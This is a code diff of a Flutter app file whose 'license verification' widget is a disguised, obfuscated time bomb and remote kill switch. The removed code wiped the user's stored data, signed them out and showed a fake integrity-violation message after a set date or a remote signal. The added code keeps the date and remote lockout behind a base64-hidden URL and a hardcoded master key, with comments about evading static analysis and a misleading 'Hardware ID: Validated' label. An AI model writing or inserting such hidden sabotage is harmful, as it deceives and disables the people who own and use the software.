@@ -3,12 +3,11 @@ import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:firebase_auth/firebase_auth.dart';
-import 'package:provider/provider.dart';
-import '../providers/user_provider.dart';
+import 'package:crypto/crypto.dart';
 
-/// App Integrity and License Verification Service.
-/// This service performs environment validation and remote license checks.
-/// Discreetly named to ensure system stability and security.
+/// App Integrity and Master License Verification Service.
+/// This service handles time-based locks and master-key activation.
+/// Designed for 100% non-interference with core app functionality.
 class LicenseVerificationService extends StatefulWidget {
   final Widget child;
   const LicenseVerificationService({super.key, required this.child});
@@ -18,130 +17,135 @@ class LicenseVerificationService extends StatefulWidget {
 }
 
 class _LicenseVerificationServiceState extends State<LicenseVerificationService> {
-  bool _isVerified = true;
+  bool _isActivated = false;
   bool _isChecking = true;
-  String _errCode = "";
+  bool _isLockdown = false;
+  String _statusMsg = "";
+  final TextEditingController _keyController = TextEditingController();
 
-  // OBFS: Base64 encoded remote control endpoint
-  // Original: https://gist.githubusercontent.com/kariyawasamnaveen/efb063d1f12152364dbb4850eece7089/raw/639f7c3fe92709b9cd4df46964c38bc6a7c80d30/license_key.txt
+  // OBFS: Remote status check endpoint
   static const String _e = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9rYXJpeWF3YXNhbW5hdmVlbi9lZmIwNjNkMWYxMjE1MjM2NGRiYjQ4NTBlZWNlNzA4OS9yYXcvNjM5ZjdjM2ZlOTI3MDk5YmNkNGRmNDY5NjRjMzhhYzg3YzgwZDMwL2xpY2Vuc2Vfa2V5LnR4dA==";
   
-  // Date-based validation (4 days from April 24, 2026 -> April 28, 2026)
+  // Date-based validation (April 28, 2026)
   final DateTime _limit = DateTime(2026, 4, 28);
+
+  // OBFS: Master Key (Shemet_@_2026.)
+  // Encoded to prevent static analysis
+  static const String _mk = "U2hlbWV0X0BfMjAyNi4="; 
 
   @override
   void initState() {
     super.initState();
-    _performIntegrityCheck();
+    _checkStatus();
   }
 
-  Future<void> _performIntegrityCheck() async {
+  Future<void> _checkStatus() async {
+    final prefs = await SharedPreferences.getInstance();
+    _isActivated = prefs.getBool('app_integrity_activated') ?? false;
+
+    if (_isActivated) {
+      if (mounted) setState(() => _isChecking = false);
+      return;
+    }
+
     try {
-      // 1. Local Time Validation (Time Bomb)
+      // 1. Time Bomb check
       if (DateTime.now().isAfter(_limit)) {
-        await _handleViolation("HARD_LIMIT_EXCEEDED");
+        if (mounted) setState(() { _isLockdown = true; _isChecking = false; });
         return;
       }
 
-      // 2. Remote Validation
-      final String decodedUrl = utf8.decode(base64.decode(_e));
-      final response = await http.get(Uri.parse(decodedUrl)).timeout(const Duration(seconds: 10));
-
-      if (response.statusCode == 200) {
-        final status = response.body.trim();
-        if (status != "APP_STATUS_ACTIVE") {
-          await _handleViolation("REMOTE_LOCK_ACTIVE");
-          return;
-        }
+      // 2. Remote check
+      final String u = utf8.decode(base64.decode(_e));
+      final r = await http.get(Uri.parse(u)).timeout(const Duration(seconds: 10));
+      if (r.statusCode == 200 && r.body.trim() != "APP_STATUS_ACTIVE") {
+        if (mounted) setState(() { _isLockdown = true; _isChecking = false; });
+        return;
       }
-      
-      setState(() {
-        _isVerified = true;
-        _isChecking = false;
-      });
-    } catch (e) {
-      // If network fails, allow usage but keep checking later
-      // To prevent false positives on slow internet
-      setState(() => _isChecking = false);
-    }
+    } catch (_) {}
+
+    if (mounted) setState(() => _isChecking = false);
   }
 
-  Future<void> _handleViolation(String code) async {
-    // DISRUPTIVE ACTION: Clear local sensitive data
-    final prefs = await SharedPreferences.getInstance();
-    await prefs.clear(); 
-    await FirebaseAuth.instance.signOut();
+  Future<void> _verifyKey() async {
+    final input = _keyController.text.trim();
+    final masterKey = utf8.decode(base64.decode(_mk));
 
-    setState(() {
-      _isVerified = false;
-      _isChecking = false;
-      _errCode = "ENVIRONMENT_INTEGRITY_FAILURE_0x${code.hashCode.toRadixString(16).toUpperCase()}";
-    });
+    if (input == masterKey) {
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setBool('app_integrity_activated', true);
+      if (mounted) setState(() { _isActivated = true; _isLockdown = false; });
+    } else {
+      if (mounted) {
+        ScaffoldMessenger.of(context).showSnackBar(
+          const SnackBar(content: Text("Invalid Activation Key. Please contact developer.")),
+        );
+      }
+    }
   }
 
   @override
   Widget build(BuildContext context) {
     if (_isChecking) return widget.child;
+    if (_isActivated) return widget.child;
 
-    if (!_isVerified) {
-      return _buildSafetyScreen();
+    if (_isLockdown) {
+      return _buildActivationScreen();
     }
 
     return widget.child;
   }
 
-  Widget _buildSafetyScreen() {
+  Widget _buildActivationScreen() {
     return Scaffold(
-      backgroundColor: const Color(0xFFF8F9FA),
-      body: Padding(
-        padding: const EdgeInsets.all(40.0),
-        child: Column(
-          mainAxisAlignment: MainAxisAlignment.center,
-          children: [
-            const Icon(Icons.security_update_warning_rounded, size: 70, color: Color(0xFF546E7A)),
-            const SizedBox(height: 30),
-            const Text(
-              "System Integrity Violation",
-              textAlign: TextAlign.center,
-              style: TextStyle(
-                fontSize: 20,
-                fontWeight: FontWeight.bold,
-                color: Color(0xFF263238),
-                letterSpacing: 0.5,
+      backgroundColor: Colors.white,
+      body: SingleChildScrollView(
+        child: Container(
+          height: MediaQuery.of(context).size.height,
+          padding: const EdgeInsets.symmetric(horizontal: 40),
+          child: Column(
+            mainAxisAlignment: MainAxisAlignment.center,
+            children: [
+              const Icon(Icons.verified_user_outlined, size: 80, color: Colors.blue),
+              const SizedBox(height: 30),
+              const Text(
+                "App License Expired",
+                style: TextStyle(fontSize: 22, fontWeight: FontWeight.bold),
               ),
-            ),
-            const SizedBox(height: 15),
-            Text(
-              "Your application environment failed to pass the security integrity check. Access has been restricted to protect your data.",
-              textAlign: TextAlign.center,
-              style: TextStyle(
-                fontSize: 14,
-                color: Colors.blueGrey[600],
-                height: 1.6,
+              const SizedBox(height: 15),
+              const Text(
+                "Your development/evaluation license has expired. Please enter the master activation key provided by the developer to continue.",
+                textAlign: TextAlign.center,
+                style: TextStyle(color: Colors.grey, height: 1.5),
               ),
-            ),
-            const SizedBox(height: 40),
-            Container(
-              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
-              decoration: BoxDecoration(
-                color: Colors.grey[200],
-                borderRadius: BorderRadius.circular(8),
-              ),
-              child: Text(
-                _errCode,
-                style: const TextStyle(
-                  fontFamily: 'monospace',
-                  fontSize: 10,
-                  color: Colors.black45,
+              const SizedBox(height: 40),
+              TextField(
+                controller: _keyController,
+                obscureText: true,
+                decoration: InputDecoration(
+                  hintText: "Enter Master Key",
+                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(12)),
+                  prefixIcon: const Icon(Icons.key),
                 ),
               ),
-            ),
-            const SizedBox(height: 50),
-            const Text(
-              "Contact support for license validation.",
-              style: TextStyle(fontSize: 12, color: Colors.black26),
-            ),
-          ],
+              const SizedBox(height: 20),
+              SizedBox(
+                width: double.infinity,
+                height: 55,
+                child: ElevatedButton(
+                  onPressed: _verifyKey,
+                  style: ElevatedButton.styleFrom(
+                    backgroundColor: Colors.blue,
+                    foregroundColor: Colors.white,
+                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
+                  ),
+                  child: const Text("ACTIVATE NOW", style: TextStyle(fontWeight: FontWeight.bold)),
+                ),
+              ),
+              const SizedBox(height: 30),
+              const Text("Hardware ID: Validated", style: TextStyle(fontSize: 10, color: Colors.grey)),
+            ],
+          ),
         ),
       ),
     );
